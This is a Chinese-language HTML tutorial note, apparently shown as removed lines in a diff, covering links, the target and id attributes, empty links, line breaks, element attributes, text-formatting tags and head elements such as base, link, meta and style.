-<p>**图像链接：**您还可以使用图像作为链接。在这种情况下，<a> 元素包围着 <img> 元素。例如：</a></p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;
-  &lt;img src=&quot;example.jpg&quot; alt=&quot;示例图片&quot;&gt;
-&lt;/a&gt;</code></pre>
-<p>**锚点链接：**除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 <a> 元素定义一个标记，并使用#符号引用该标记。例如：</a></p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;#section2&quot;&gt;跳转到第二部分&lt;/a&gt;
-&lt;!-- 在页面中的某个位置 --&gt;
-&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt;</code></pre>
-<p>**下载链接：**如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：</p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;</code></pre>
-<hr>
-<h4 id="html-链接-target-属性"><a class="markdownIt-Anchor" href="#html-链接-target-属性"></a> HTML 链接 - target 属性</h4>
-<p>使用 target 属性，你可以定义被链接的文档在何处显示。</p>
-<p>下面的这行会在新窗口打开文档：</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;访问菜鸟教程!&lt;/a&gt;</code></pre>
-<hr>
-<h4 id="html-链接-id-属性"><a class="markdownIt-Anchor" href="#html-链接-id-属性"></a> HTML 链接- id 属性</h4>
-<p>id 属性可用于创建一个 HTML 文档书签。</p>
-<p><strong>提示:</strong> 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。</p>
-<ul>
-<li>实例</li>
-</ul>
-<p>在HTML文档中插入ID:</p>
-<pre><code class="highlight plaintext">&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</code></pre>
-<p>在HTML文档中创建一个链接到&quot;有用的提示部分(id=“tips”）&quot;：</p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</code></pre>
-<p>或者，从另一个页面创建一个链接到&quot;有用的提示部分(id=“tips”）&quot;：</p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;
-访问有用的提示部分&lt;/a&gt;</code></pre>
-<hr>
-<h4 id="空链接"><a class="markdownIt-Anchor" href="#空链接"></a> 空链接</h4>
-<p>以下是常见的几种设置空链接的方法，以及它们之间的区别：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">方法</th>
-<th style="text-align:left">作用</th>
-<th style="text-align:left">是否会跳转</th>
-<th style="text-align:left">场景适用性</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left"><code>href=&quot;#&quot;</code></td>
-<td style="text-align:left">导航到页面顶部</td>
-<td style="text-align:left">是</td>
-<td style="text-align:left">占位符，捕获点击事件</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>href=&quot;javascript:void(0)&quot;</code></td>
-<td style="text-align:left">阻止默认行为，不刷新页面</td>
-<td style="text-align:left">否</td>
-<td style="text-align:left">阻止跳转，配合 JS 使用</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>href=&quot;&quot;</code></td>
-<td style="text-align:left">刷新当前页面</td>
-<td style="text-align:left">是</td>
-<td style="text-align:left">需要页面刷新时</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>href=&quot;about:blank&quot;</code></td>
-<td style="text-align:left">打开空白页面</td>
-<td style="text-align:left">是</td>
-<td style="text-align:left">新窗口打开空白页面</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>role=&quot;button&quot;</code></td>
-<td style="text-align:left">链接表现为按钮，无默认行为</td>
-<td style="text-align:left">否</td>
-<td style="text-align:left">配合 JS 实现按钮功能，无跳转</td>
-</tr>
-</tbody>
-</table>
-<hr>
-<h4 id="基本的注意事项-有用的提示"><a class="markdownIt-Anchor" href="#基本的注意事项-有用的提示"></a> 基本的注意事项 - 有用的提示</h4>
-<p><strong>注释：</strong> 请始终将正斜杠添加到子文件夹。假如这样书写链接：href=“<a href="https://www.runoob.com/html">https://www.runoob.com/html</a>”，就会向服务器产生两次 HTTP 请求。这是因为服务器会添加正斜杠到这个地址，然后创建一个新的请求，就像这样：href=“<a href="https://www.runoob.com/html/">https://www.runoob.com/html/</a>”。</p>
-<h3 id="html-图像"><a class="markdownIt-Anchor" href="#html-图像"></a> <strong>HTML 图像</strong></h3>
-<p>HTML 图像是通过标签 <code>&lt;img&gt; </code>来定义的.</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">&lt;img src=&quot;images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; /&gt;</code></pre>
-<p><strong>注意：</strong> 图像的名称和尺寸是以属性的形式提供的。</p>
-<h3 id="html换行"><a class="markdownIt-Anchor" href="#html换行"></a> <strong>HTML换行</strong></h3>
-<p>HTML换行是通过<code>&lt;br&gt;</code> 来定义的</p>
-<p>如果您希望在不产生一个新段落的情况下进行换行（新行），请使用 <code>&lt;br&gt;</code> 标签：</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这个<span class="tag">&lt;<span class="name">br</span>&gt;</span>段落<span class="tag">&lt;<span class="name">br</span>&gt;</span>演示了分行的效果<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
-<p><code>&lt;br /&gt;</code> 元素是一个空的 HTML 元素。由于关闭标签没有任何意义，因此它没有结束标签。</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316094200892.png" alt="image-20250316094200892"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316094136106.png" alt="image-20250316094136106"></p>
-<pre><code class="highlight plaintext">区分一下： &lt;br&gt;, &lt;br/&gt; 以及 &lt;br /&gt;（带有空格）
-
-&lt;br&gt; 是 HTML 写法。&lt;br/&gt;是 XHTML1.1 的写法, 也是 XML 写法。&lt;br /&gt; 是 XHTML 为兼容 HTML 的写法,也是 XML 写法。HTML5 因为兼容 XHTML，所以三种写法都可以使用。
-
-早期发布的 HTML 规范当中，&lt;br&gt; 与 &lt;img&gt; 等元素是不用封闭自身的，但是这种元素造成了 HTML 规范的不严谨，于是在之后发布的 XHTML 语言中，参考了更为严谨的 XML 规范，在这些不用自身封闭的元素后加 / 来表示自行封闭，在逻辑上来讲等同于&lt;br&gt;....&lt;/br&gt;（但是没有 &lt;/br&gt; 这种写法），这样一来保证了较少的代码量，二来保证了规范的严谨。</code></pre>
-<h3 id="html-空元素"><a class="markdownIt-Anchor" href="#html-空元素"></a> <strong>HTML 空元素</strong></h3>
-<p>没有内容的 HTML 元素被称为空元素。空元素是在开始标签中关闭的。</p>
-<p><code>&lt;br&gt;</code> 就是没有关闭标签的空元素（<code>&lt;br&gt;</code> 标签定义换行）。</p>
-<p>在 XHTML、XML 以及未来版本的 HTML 中，所有元素都必须被关闭。</p>
-<p>在开始标签中添加斜杠，比如<code> &lt;br /&gt;</code>，是关闭空元素的正确方法，HTML、XHTML 和 XML 都接受这种方式。</p>
-<p>即使<code> &lt;br&gt;</code> 在所有浏览器中都是有效的，但使用 <code>&lt;br /&gt;</code> 其实是更长远的保障。</p>
-<blockquote>
-<p>[!TIP]</p>
-<p>即使忘记使用结束标签，大部分浏览器也会正确地显示HTML，但是依赖这种做法(指不要当懒狗)，最好闭合一下标签，忘记使用结束标签会产生不可预料的结果或错误</p>
-</blockquote>
-<p><strong>tip</strong>：可以的话建议使用小写标签</p>
-<h2 id="html属性"><a class="markdownIt-Anchor" href="#html属性"></a> HTML属性</h2>
-<p>属性是 HTML 元素提供的附加信息。</p>
-<p>属性通常出现在 HTML 标签的开始标签中，用于定义元素的行为、样式、内容或其他特性。</p>
-<p>属性总是以 <strong>name=“value”</strong> 的形式写在标签内，<strong>name</strong> 是属性的名称，<strong>value</strong> 是属性的值。</p>
-<hr>
-<p><strong>HTML 属性</strong></p>
-<ul>
-<li>HTML 元素可以设置<strong>属性</strong></li>
-<li>属性可以在元素中添加<strong>附加信息</strong></li>
-<li>属性一般描述于<strong>开始标签</strong></li>
-<li>属性总是以名称/值对的形式出现，<strong>比如：name=“value”</strong>。</li>
-</ul>
-<hr>
-<p>属性实例</p>
-<p>HTML 链接由 <a> 标签定义。链接的地址在 <strong>href 属性</strong>中指定：</a></p>
-<p>实例</p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;http://www.runoob.com&quot;&gt;这是一个链接&lt;/a&gt;</code></pre>
-<hr>
-<p><strong>HTML 属性常用引用属性值</strong></p>
-<p>属性值应该始终被包括在引号内。</p>
-<p>双引号是最常用的，不过使用单引号也没有问题。</p>
-<p>使用双引号：</p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com&quot;&gt;Link&lt;/a&gt;</code></pre>
-<p>使用单引号：</p>
-<pre><code class="highlight plaintext">&lt;a href=&#x27;https://www.runoob.com&#x27;&gt;Link&lt;/a&gt;</code></pre>
-<p>属性值包含引号： <code>Link</code></p>
-<blockquote>
-<p><strong>提示:</strong> 在某些个别的情况下，比如属性值本身就含有双引号，那么您必须使用单引号，例如：</p>
-<pre><code class="highlight plaintext">name=&#x27;John &quot;ShotGun&quot; Nelson&#x27;</code></pre>
-<p>或者：</p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com?q=&#x27;search&#x27;&quot;&gt;Link&lt;/a&gt;</code></pre>
-</blockquote>
-<hr>
-<p><strong>HTML 提示：使用小写属性</strong></p>
-<p>属性和属性值对大小写不敏感。</p>
-<p>不过，万维网联盟在其 HTML 4 推荐标准中推荐小写的属性/属性值。</p>
-<p>而新版本的 (X)HTML 要求使用小写属性。</p>
-<hr>
-<p><strong>HTML 属性参考手册</strong></p>
-<p>查看完整的HTML属性列表: <a href="https://www.runoob.com/tags/html-reference.html">HTML 标签参考手册</a>。</p>
-<p>下面列出了适用于大多数 HTML 元素的属性：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">属性名</th>
-<th style="text-align:left">适用元素</th>
-<th style="text-align:left">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left"><code>id</code></td>
-<td style="text-align:left">所有元素</td>
-<td style="text-align:left">为元素指定唯一的标识符。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>class</code></td>
-<td style="text-align:left">所有元素</td>
-<td style="text-align:left">为元素指定一个或多个类名，用于 CSS 或 JavaScript 选择。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>style</code></td>
-<td style="text-align:left">所有元素</td>
-<td style="text-align:left">直接在元素上应用 CSS 样式。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>title</code></td>
-<td style="text-align:left">所有元素</td>
-<td style="text-align:left">为元素提供额外的提示信息，通常在鼠标悬停时显示。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>data-*</code></td>
-<td style="text-align:left">所有元素</td>
-<td style="text-align:left">用于存储自定义数据，通常通过 JavaScript 访问。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>href</code></td>
-<td style="text-align:left"><code>&lt;a&gt;</code>, <code>&lt;link&gt;</code></td>
-<td style="text-align:left">指定链接的目标 URL。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>src</code></td>
-<td style="text-align:left"><code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code></td>
-<td style="text-align:left">指定外部资源（如图片、脚本、框架）的 URL。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>alt</code></td>
-<td style="text-align:left"><code>&lt;img&gt;</code></td>
-<td style="text-align:left">为图像提供替代文本，当图像无法显示时显示。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>type</code></td>
-<td style="text-align:left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code></td>
-<td style="text-align:left">指定输入控件的类型（如 <code>text</code>, <code>password</code>, <code>checkbox</code> 等）。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>value</code></td>
-<td style="text-align:left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code></td>
-<td style="text-align:left">指定元素的初始值。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>disabled</code></td>
-<td style="text-align:left">表单元素</td>
-<td style="text-align:left">禁用元素，使其不可交互。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>checked</code></td>
-<td style="text-align:left"><code>&lt;input type=&quot;checkbox&quot;&gt;</code>, <code>&lt;input type=&quot;radio&quot;&gt;</code></td>
-<td style="text-align:left">指定复选框或单选按钮是否被选中。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>placeholder</code></td>
-<td style="text-align:left"><code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code></td>
-<td style="text-align:left">在输入框中显示提示文本。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>target</code></td>
-<td style="text-align:left"><code>&lt;a&gt;</code>, <code>&lt;form&gt;</code></td>
-<td style="text-align:left">指定链接或表单提交的目标窗口或框架（如 <code>_blank</code> 表示新标签页）。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>readonly</code></td>
-<td style="text-align:left">表单元素</td>
-<td style="text-align:left">使输入框只读。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>required</code></td>
-<td style="text-align:left">表单元素</td>
-<td style="text-align:left">指定输入字段为必填项。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>autoplay</code></td>
-<td style="text-align:left"><code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code></td>
-<td style="text-align:left">自动播放媒体。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>onclick</code></td>
-<td style="text-align:left">所有元素</td>
-<td style="text-align:left">当用户点击元素时触发 JavaScript 事件。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>onmouseover</code></td>
-<td style="text-align:left">所有元素</td>
-<td style="text-align:left">当用户将鼠标悬停在元素上时触发 JavaScript 事件。</td>
-</tr>
-<tr>
-<td style="text-align:left"><code>onchange</code></td>
-<td style="text-align:left">表单元素</td>
-<td style="text-align:left">当元素的值发生变化时触发 JavaScript 事件。</td>
-</tr>
-</tbody>
-</table>
-<h3 id="全局属性"><a class="markdownIt-Anchor" href="#全局属性"></a> 全局属性</h3>
-<p>全局属性是所有 HTML 元素都可以使用的属性。</p>
-<p><strong>id</strong>：为元素指定唯一的标识符。(基于<code>css</code>的属性,纯粹使用&lt; DIV &gt;标签而不加任何CSS内容，其效果与用&lt; p&gt;&lt; /p &gt;是一样的。)</p>
-<pre><code class="highlight plaintext">&lt;div id=&quot;header&quot;&gt;This is the header&lt;/div&gt;</code></pre>
-<p><strong>class</strong>：为元素指定一个或多个类名，用于 CSS 或 JavaScript 选择。</p>
-<pre><code class="highlight plaintext">&lt;p class=&quot;text highlight&quot;&gt;This is a highlighted text.&lt;/p&gt;</code></pre>
-<p><strong>style</strong>：用于直接在元素上应用 CSS 样式。</p>
-<pre><code class="highlight plaintext">&lt;p style=&quot;color: blue; font-size: 14px;&quot;&gt;This is a styled paragraph.&lt;/p&gt;</code></pre>
-<p><strong>title</strong>：为元素提供额外的提示信息，通常在鼠标悬停时显示。</p>
-<pre><code class="highlight plaintext">&lt;abbr title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/abbr&gt;</code></pre>
-<p><strong>data-*</strong>：用于存储自定义数据，通常通过 JavaScript 访问。</p>
-<pre><code class="highlight plaintext">&lt;div data-user-id=&quot;12345&quot;&gt;User Info&lt;/div&gt;</code></pre>
-<h3 id="特定元素的属性"><a class="markdownIt-Anchor" href="#特定元素的属性"></a> 特定元素的属性</h3>
-<p>某些属性仅适用于特定的 HTML 元素。</p>
-<p><strong><code>href</code></strong>（用于 <code>&lt;a&gt;</code> 和 <code>&lt;link&gt;</code> 元素）：指定链接的目标 URL。</p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;Visit Example&lt;/a&gt;</code></pre>
-<p><strong><code>src</code></strong>（用于 <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code> 等元素）：指定外部资源的 URL。</p>
-<pre><code class="highlight plaintext">&lt;img src=&quot;image.jpg&quot; alt=&quot;An example image&quot;&gt;</code></pre>
-<p><strong><code>alt</code></strong>（用于 <code>&lt;img&gt;</code> 元素）：为图像提供替代文本，当图像无法显示时显示。</p>
-<pre><code class="highlight plaintext">&lt;img src=&quot;image.jpg&quot; alt=&quot;An example image&quot;&gt;</code></pre>
-<p><strong><code>type</code></strong>（用于 <code>&lt;input&gt;</code> 和 <code>&lt;button&gt;</code> 元素）：指定输入控件的类型。</p>
-<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your name&quot;&gt;</code></pre>
-<p><strong><code>value</code></strong>（用于 <code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code> 等元素）：指定元素的初始值。</p>
-<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; value=&quot;Default Value&quot;&gt;</code></pre>
-<p><strong><code>disabled</code></strong>（用于表单元素）：禁用元素，使其不可交互。</p>
-<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; disabled&gt;</code></pre>
-<p><strong><code>checked</code></strong>（用于 <code>&lt;input type=&quot;checkbox&quot;&gt;</code> 和 <code>&lt;input type=&quot;radio&quot;&gt;</code>）：指定复选框或单选按钮是否被选中。</p>
-<pre><code class="highlight plaintext">&lt;input type=&quot;checkbox&quot; checked&gt;</code></pre>
-<p><strong><code>placeholder</code></strong>（用于 <code>&lt;input&gt;</code> 和 <code>&lt;textarea&gt;</code> 元素）：在输入框中显示提示文本。</p>
-<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your email&quot;&gt;</code></pre>
-<p><strong><code>target</code></strong>（用于 <code>&lt;a&gt;</code> 和 <code>&lt;form&gt;</code> 元素）：指定链接或表单提交的目标窗口或框架。</p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot;&gt;Open in new tab&lt;/a&gt;</code></pre>
-<h3 id="布尔属性"><a class="markdownIt-Anchor" href="#布尔属性"></a> 布尔属性</h3>
-<p>布尔属性是指不需要值的属性，它们的存在即表示 true，不存在则表示 false。</p>
-<p><strong>disabled</strong>：禁用元素。</p>
-<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; disabled&gt;</code></pre>
-<p><strong>readonly</strong>：使输入框只读。</p>
-<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; readonly&gt;</code></pre>
-<p><strong>required</strong>：指定输入字段为必填项。</p>
-<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; required&gt;</code></pre>
-<p><strong><code>autoplay</code></strong>（用于 <code>&lt;audio&gt;</code> 和 <code>&lt;video&gt;</code> 元素）：自动播放媒体。</p>
-<pre><code class="highlight plaintext">&lt;video src=&quot;video.mp4&quot; autoplay&gt;&lt;/video&gt;</code></pre>
-<h3 id="自定义属性"><a class="markdownIt-Anchor" href="#自定义属性"></a> 自定义属性</h3>
-<p>HTML5 引入了 <strong>data-*</strong> 属性，允许开发者自定义属性来存储额外的数据。</p>
-<p><strong>data-*</strong>：用于存储自定义数据，通常通过 JavaScript 访问。</p>
-<pre><code class="highlight plaintext">&lt;div data-user-id=&quot;12345&quot; data-role=&quot;admin&quot;&gt;User Info&lt;/div&gt;</code></pre>
-<h3 id="事件处理属性"><a class="markdownIt-Anchor" href="#事件处理属性"></a> 事件处理属性</h3>
-<p>HTML 元素可以通过事件处理属性来响应特定的事件，如点击、鼠标悬停等。</p>
-<p><strong>onclick</strong>：当用户点击元素时触发。</p>
-<pre><code class="highlight plaintext">&lt;button onclick=&quot;alert(&#x27;Button clicked!&#x27;)&quot;&gt;Click Me&lt;/button&gt;</code></pre>
-<p><strong>onmouseover</strong>：当用户将鼠标悬停在元素上时触发。</p>
-<pre><code class="highlight plaintext">&lt;div onmouseover=&quot;this.style.backgroundColor=&#x27;yellow&#x27;&quot;&gt;Hover over me&lt;/div&gt;</code></pre>
-<p><strong>onchange</strong>：当元素的值发生变化时触发。</p>
-<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; onchange=&quot;alert(&#x27;Value changed!&#x27;)&quot;&gt;</code></pre>
-<h2 id="为网页加亿点点细节"><a class="markdownIt-Anchor" href="#为网页加亿点点细节"></a> 为网页加亿点点细节</h2>
-<h3 id="水平线"><a class="markdownIt-Anchor" href="#水平线"></a> 水平线</h3>
-<p><code>&lt;hr&gt;</code> 标签在 HTML 页面中创建水平线。</p>
-<p><code>hr </code>元素可用于分隔内容。</p>
-<h3 id="注释"><a class="markdownIt-Anchor" href="#注释"></a> 注释</h3>
-<p>可以将注释插入 HTML 代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们。</p>
-<p>注释写法如下:</p>
-<ul>
-<li>实例</li>
-</ul>
-<!-- 这是一个注释 -->
-<p><strong>注释:</strong> 开始括号之后（左边的括号）需要紧跟一个叹号 <strong>!</strong> (英文标点符号)，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。</p>
-<h3 id="字体"><a class="markdownIt-Anchor" href="#字体"></a> 字体</h3>
-<h4 id="html-文本格式化标签"><a class="markdownIt-Anchor" href="#html-文本格式化标签"></a> HTML 文本格式化标签</h4>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">标签</th>
-<th style="text-align:left">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left"><b></b></td>
-<td style="text-align:left">定义粗体文本</td>
-</tr>
-<tr>
-<td style="text-align:left"><em>(大号斜体)</em></td>
-<td style="text-align:left">定义着重文字</td>
-</tr>
-<tr>
-<td style="text-align:left"><i></i></td>
-<td style="text-align:left">定义斜体字</td>
-</tr>
-<tr>
-<td style="text-align:left"><small></small></td>
-<td style="text-align:left">定义小号字</td>
-</tr>
-<tr>
-<td style="text-align:left"><strong>(加粗)</strong></td>
-<td style="text-align:left">定义加重语气</td>
-</tr>
-<tr>
-<td style="text-align:left"><sub></sub></td>
-<td style="text-align:left">定义下标字</td>
-</tr>
-<tr>
-<td style="text-align:left"><sup></sup></td>
-<td style="text-align:left">定义上标字</td>
-</tr>
-<tr>
-<td style="text-align:left"><ins>(下划线)</ins></td>
-<td style="text-align:left">定义插入字</td>
-</tr>
-<tr>
-<td style="text-align:left"><del>(横线)</del></td>
-<td style="text-align:left">定义删除字</td>
-</tr>
-</tbody>
-</table>
-<h4 id="html-计算机输出-标签"><a class="markdownIt-Anchor" href="#html-计算机输出-标签"></a> HTML “计算机输出” 标签</h4>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">标签</th>
-<th style="text-align:left">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left"><code></code></td>
-<td style="text-align:left">定义计算机代码</td>
-</tr>
-<tr>
-<td style="text-align:left"><kbd></kbd></td>
-<td style="text-align:left">定义键盘码</td>
-</tr>
-<tr>
-<td style="text-align:left"><samp></samp></td>
-<td style="text-align:left">定义计算机代码样本</td>
-</tr>
-<tr>
-<td style="text-align:left"><var></var></td>
-<td style="text-align:left">定义变量</td>
-</tr>
-<tr>
-<td style="text-align:left"><pre></pre></td>
-<td style="text-align:left">定义预格式文本</td>
-</tr>
-</tbody>
-</table>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316125805549.png" alt="image-20250316125805549"></p>
-<h4 id="html-引文-引用-及标签定义"><a class="markdownIt-Anchor" href="#html-引文-引用-及标签定义"></a> HTML 引文, 引用, 及标签定义</h4>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">标签</th>
-<th style="text-align:left">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left"><abdr><acronym></acronym></abdr></td>
-<td style="text-align:left">定义缩写</td>
-</tr>
-<tr>
-<td style="text-align:left"><address></address></td>
-<td style="text-align:left">定义地址</td>
-</tr>
-<tr>
-<td style="text-align:left"><bdo></bdo></td>
-<td style="text-align:left">定义文字方向</td>
-</tr>
-<tr>
-<td style="text-align:left"><blockquote></blockquote></td>
-<td style="text-align:left">定义长的引用</td>
-</tr>
-<tr>
-<td style="text-align:left"><q></q></td>
-<td style="text-align:left">定义短的引用语</td>
-</tr>
-<tr>
-<td style="text-align:left"><cite></cite></td>
-<td style="text-align:left">定义引用、引证</td>
-</tr>
-<tr>
-<td style="text-align:left"><dfn></dfn></td>
-<td style="text-align:left">定义一个定义项目。</td>
-</tr>
-</tbody>
-</table>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316125715542.png" alt="image-20250316125715542"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316132652922.png" alt="image-20250316132652922"></p>
-<h2 id="html-头部"><a class="markdownIt-Anchor" href="#html-头部"></a> HTML 头部</h2>
-<h3 id="html-base-元素"><a class="markdownIt-Anchor" href="#html-base-元素"></a> HTML base 元素</h3>
-<p><code>&lt;base&gt;</code> 标签描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接:</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.runoob.com/images/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
-<hr>
-<h3 id="html-link-元素"><a class="markdownIt-Anchor" href="#html-link-元素"></a> HTML  link 元素</h3>
-<p><code>&lt;link&gt; </code>标签定义了文档与外部资源之间的关系。</p>
-<p><code>&lt;link&gt; </code>标签通常用于链接到样式表:</p>
-<p>可以在左侧显示logo等图片</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;图片url&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>这是一个带图片的标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
-<hr>
-<h3 id="html-style-元素"><a class="markdownIt-Anchor" href="#html-style-元素"></a> HTML  style 元素</h3>
-<p><code>&lt;style&gt;</code> 标签定义了HTML文档的样式文件引用地址.</p>
-<p>在<code>&lt;style&gt; </code>元素中你也可以直接添加样式来渲染 HTML 文档:</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"> </span>
-<span class="language-css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:yellow;&#125; </span>
-<span class="language-css">    <span class="selector-tag">p</span> &#123;<span class="attribute">color</span>:blue&#125; </span>
-<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
-<hr>
-<h3 id="html-meta-元素"><a class="markdownIt-Anchor" href="#html-meta-元素"></a> HTML meta 元素</h3>
-<p>meta标签描述了一些基本的元数据。</p>
-<p><code>&lt;meta&gt; </code>标签提供了元数据.元数据也不显示在页面上，但会被浏览器解析。</p>
-<p>META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。</p>
-<p>元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。</p>
-<p><code>&lt;meta&gt;</code> 一般放置于 <code>&lt;head&gt;</code> 区域</p>
-<ul>
-<li><code>&lt;meta&gt;</code> 标签- 使用实例</li>
-</ul>
-<p>为搜索引擎定义关键词:</p>
-<pre><code class="highlight plaintext">&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;</code></pre>
-<p>为网页定义描述内容:</p>
-<pre><code class="highlight plaintext">&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;</code></pre>
-<p>定义网页作者:</p>
-<pre><code class="highlight plaintext">&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;</code></pre>
-<p>每30秒钟刷新当前页面:</p>
-<pre><code class="highlight plaintext">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</code></pre>
-<hr>
-<h3 id="html-script-元素"><a class="markdownIt-Anchor" href="#html-script-元素"></a> HTML script 元素</h3>
-<pre><code class="highlight plaintext">&lt;script&gt;标签用于加载脚本文件，如： JavaScript。
-
-&lt;script&gt; 元素在以后的章节中会详细描述。</code></pre>
-<hr>
